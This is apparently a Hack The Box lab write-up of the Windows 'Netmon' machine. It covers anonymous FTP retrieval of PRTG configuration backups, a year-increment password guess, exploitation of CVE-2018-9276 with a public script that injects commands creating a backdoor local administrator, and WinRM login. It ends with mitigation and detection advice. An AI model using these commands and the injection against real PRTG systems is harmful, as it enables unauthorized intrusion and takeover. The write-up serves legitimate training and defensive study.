# Netmon - Hack The Box Writeup

## Overview

| Field      | Details                        |
|------------|--------------------------------|
| Machine    | Netmon                         |
| Difficulty | Easy                           |
| OS         | Windows Server 2016            |
| Platform   | Hack The Box                   |
| IP         | 10.129.26.212                  |
| CVE        | CVE-2018-9276                  |

---

## Executive Summary

Netmon is a Windows machine running PRTG Network Monitor with anonymous FTP access enabled over the entire system drive. The FTP service exposes PRTG configuration backup files that contain administrator credentials in cleartext. The credentials were rotated since the backup was created, but a simple year-increment mutation recovers the working password. Once authenticated to PRTG, an authenticated command injection vulnerability (CVE-2018-9276) in the notification subsystem allows arbitrary OS command execution as SYSTEM, giving immediate full administrator access with no privilege escalation required.

---

## Reconnaissance

We start with a full port scan with version and default script detection:

```bash
nmap -sC -sV --min-rate=1000 -p- 10.129.26.212
```


### Open Ports

| Port     | Service       | Detail                                      |
|----------|---------------|---------------------------------------------|
| 21/tcp   | FTP           | Microsoft ftpd — **anonymous login allowed**|
| 80/tcp   | HTTP          | PRTG Network Monitor 18.1.37.13946          |
| 135/tcp  | MSRPC         | Windows RPC                                 |
| 139/tcp  | NetBIOS-SSN   | Windows NetBIOS                             |
| 445/tcp  | SMB           | Windows Server 2016, signing disabled       |
| 5985/tcp | WinRM (HTTP)  | Microsoft HTTPAPI 2.0                       |

### Key Observations

Two services immediately stand out: **anonymous FTP** and **PRTG Network Monitor**. Anonymous FTP is dangerous because it grants unauthenticated read access to the filesystem — in this case the entire C: drive — without any credentials. PRTG is a network monitoring platform that runs as SYSTEM and stores its configuration, including credentials, on disk. The combination of these two services creates a direct path to full compromise.

---

## Enumeration

### FTP — Anonymous Access

Anonymous FTP allows any user to log in without credentials. This is a critical misconfiguration because PRTG stores its configuration files — including encrypted and sometimes plaintext credentials — under `C:\ProgramData\Paessler\`, which is accessible via FTP.

```bash
ftp 10.129.26.212
# Username: anonymous
# Password: (blank)
```


We navigate directly to the PRTG data directory:

```
cd ProgramData/Paessler/PRTG Network Monitor
ls
```


Three configuration files are present:

| File                            | Description                            |
|---------------------------------|----------------------------------------|
| `PRTG Configuration.dat`        | Current live configuration             |
| `PRTG Configuration.old`        | Previous configuration                 |
| `PRTG Configuration.old.bak`    | Oldest backup — most likely to contain legacy credentials |

We download the oldest backup, as it is most likely to contain credentials that predate any password hardening:

```bash
python3 -c "
from ftplib import FTP
ftp = FTP('10.129.26.212')
ftp.login('anonymous', 'anonymous')
ftp.cwd('ProgramData/Paessler/PRTG Network Monitor')
with open('PRTG Configuration.old.bak', 'wb') as f:
    ftp.retrbinary('RETR PRTG Configuration.old.bak', f.write)
ftp.quit()
"
```

### Why Does PRTG Store Credentials Here?

PRTG stores its entire configuration — monitored devices, notification rules, user accounts, and credentials — in XML files under `ProgramData`. Older versions of PRTG (pre-18.x) stored passwords in these XML files with weak or no encryption. This is the root cause of the credential exposure: a monitoring tool that legitimately needs credentials for the systems it monitors stores them insecurely on disk, and FTP exposes that disk to the world.

---

## Credential Discovery

Searching the backup for credentials:

```bash
grep -A2 "prtgadmin" "PRTG Configuration.old.bak"
```

Output:

```xml
<dbpassword>
  <!-- User: prtgadmin -->
  PrTg@dmin2018
</dbpassword>
```


The password `PrTg@dmin2018` is stored in **cleartext** inside the XML backup. This is a direct consequence of PRTG's insecure credential storage design in versions prior to 18.x.

### Password Mutation

The backup file timestamp is from 2018. It is common practice for administrators to increment the year in a password when rotating credentials. We test `PrTg@dmin2019` against the PRTG API:

```bash
curl "http://10.129.26.212/api/getpasshash.htm?username=prtgadmin&password=PrTg@dmin2019"
```

Response:

```
3989397458
```

A numeric passhash confirms successful authentication. The year mutation worked.

```
Credentials: prtgadmin : PrTg@dmin2019
```

This demonstrates a common real-world failure: even when a password is changed, if the pattern is predictable (year increment), an attacker can recover it trivially.

---

## Exploitation

### Vulnerability: CVE-2018-9276 — PRTG Authenticated RCE

**CVE-2018-9276** is an authenticated OS command injection vulnerability in PRTG Network Monitor versions prior to 18.2.39. It exists in the **notification** feature, specifically in the parameter passed to the `Demo EXE Notification - OutFile.ps1` script handler.

**How it works:** PRTG allows administrators to configure notifications that execute scripts when an alert fires. The `scriptparams` field — which is passed directly to a PowerShell script — is not sanitized. An attacker can inject arbitrary OS commands using a semicolon (`;`) as a separator. Since PRTG runs as SYSTEM, the injected commands execute with the highest privilege level on the host.

**Attack surface:** The vulnerable parameter is in `editsettings` POST request:
```
message_10=<file_path>;<injected_command>
```

### Exploitation Steps

We use the public exploit script (EDB-46527), which automates three POST requests to PRTG's API — creating a notification, triggering it, and escalating it — to add a new local administrator:

```bash
# Retrieve session cookie first
curl -s -c prtg.cookies \
  "http://10.129.26.212/api/getstatus.htm?username=prtgadmin&password=PrTg@dmin2019"

# Run the exploit with the session cookie
bash 46527.sh \
  -u "http://10.129.26.212" \
  -c "OCTOPUS1813713946=<YOUR_COOKIE_VALUE>"
```

What the exploit does internally (three injection stages):

```
Stage 1: Creates a test file  → confirms script execution
Stage 2: net user pentest P3nT3st! /add   → creates local user
Stage 3: net localgroup administrators pentest /add   → elevates user
```


Output:

```
[*] adding a new user 'pentest' with password 'P3nT3st!'
[*] adding a user pentest to the administrators group
[*] exploit completed
```

### Why Not Metasploit?

The manual approach above gives visibility into exactly what the exploit does at each stage. Understanding the mechanism matters: the vulnerability is not in PRTG's authentication — it is in unsanitized input being passed to a PowerShell process running as SYSTEM. The same injection could be adapted to any OS command (e.g., adding a backdoor, exfiltrating data, or spawning a reverse shell directly).

---

## Initial Access

We connect using the newly created local administrator account via WinRM (port 5985):

```bash
evil-winrm -i 10.129.26.212 -u pentest -p 'P3nT3st!'
```

```bash
whoami
# netmon\pentest

whoami /groups | findstr "Admin"
# BUILTIN\Administrators
```


No privilege escalation is required. The injected commands ran as SYSTEM, so the created user is a full local administrator. This is a direct consequence of PRTG running as SYSTEM — any RCE through PRTG automatically yields the highest privilege level.

---

## Flags

### User Flag

```bash
type C:\Users\Public\Desktop\user.txt
```


### Root Flag

```bash
type C:\Users\Administrator\Desktop\root.txt
```


---

## Root Cause Analysis

There are three independent vulnerabilities that chain together in this attack:

**1. Anonymous FTP exposing the system drive**
FTP is configured to allow anonymous access, and its root is mapped to `C:\`. This is a deployment error — FTP should either be disabled or restricted to a dedicated directory with no access to application data. There is no technical reason for PRTG's data directory to be accessible over FTP.

**2. Cleartext credential storage in PRTG configuration backups**
PRTG versions prior to 18.x store credentials in XML configuration files without strong encryption. Backup files (`*.old.bak`) are retained indefinitely and are not purged after rotation. Even if the live configuration is updated, old backups persist with the original credentials. The root cause is PRTG's design decision to store credentials in a human-readable format on disk.

**3. CVE-2018-9276 — Unsanitized input in notification script parameters**
PRTG's notification system passes user-supplied parameters directly to PowerShell scripts without input validation or sanitization. Since PRTG runs as SYSTEM, any injected command inherits full system privileges. This is a classic injection vulnerability caused by trusting user input in a privileged execution context.

---

## Alternative Approaches

- **SMB relay attack:** SMB signing is disabled on port 445. With a man-in-the-middle position, NTLM relay attacks (e.g., via `responder` + `ntlmrelayx`) could be used to authenticate to other services without knowing credentials.
- **Direct reverse shell via CVE-2018-9276:** Instead of adding a user, the notification injection can be used to download and execute a reverse shell payload directly, avoiding the need for WinRM entirely.
- **Password spray on SMB/WinRM:** Once `prtgadmin:PrTg@dmin2019` is recovered, the same credentials could be tested against SMB and WinRM directly before using the RCE path.

---

## Mitigation & Detection

### Prevention

| Finding                          | Recommendation                                                                 |
|----------------------------------|--------------------------------------------------------------------------------|
| Anonymous FTP                    | Disable FTP entirely or restrict to authenticated users with minimal permissions |
| PRTG data exposed via FTP        | Ensure FTP root does not overlap with application data directories              |
| Cleartext credentials in backups | Upgrade PRTG to 18.2.39+; purge old `.bak` files; use credential encryption    |
| CVE-2018-9276                    | Patch PRTG to version 18.2.39 or later                                         |
| PRTG running as SYSTEM           | Run PRTG under a least-privilege service account                                |
| Predictable password patterns    | Enforce password managers and randomized credentials during rotation             |

### Detection

- Alert on anonymous FTP logins, especially followed by access to `ProgramData` paths
- Monitor PRTG notification execution logs for unexpected commands (`net user`, `net localgroup`, PowerShell downloads)
- Alert on new local administrator account creation (`Event ID 4720` + `4732`)
- Monitor WinRM connections from unexpected source IPs (`Event ID 4624`, logon type 3)

---

## Lessons Learned

- Anonymous FTP on a production Windows host is rarely justified and always dangerous
- Backup files are frequently overlooked in credential rotation — old backups can contain credentials that are still valid elsewhere
- Year-based password patterns are a predictable and easily defeated rotation strategy
- Monitoring tools often run at high privilege levels, making any RCE in them immediately critical
- A single misconfiguration (FTP) can expose the chain needed to fully compromise a system

---

## Tags

`Windows` `FTP` `PRTG` `CVE-2018-9276` `Credential Leak` `RCE` `WinRM` `Easy`
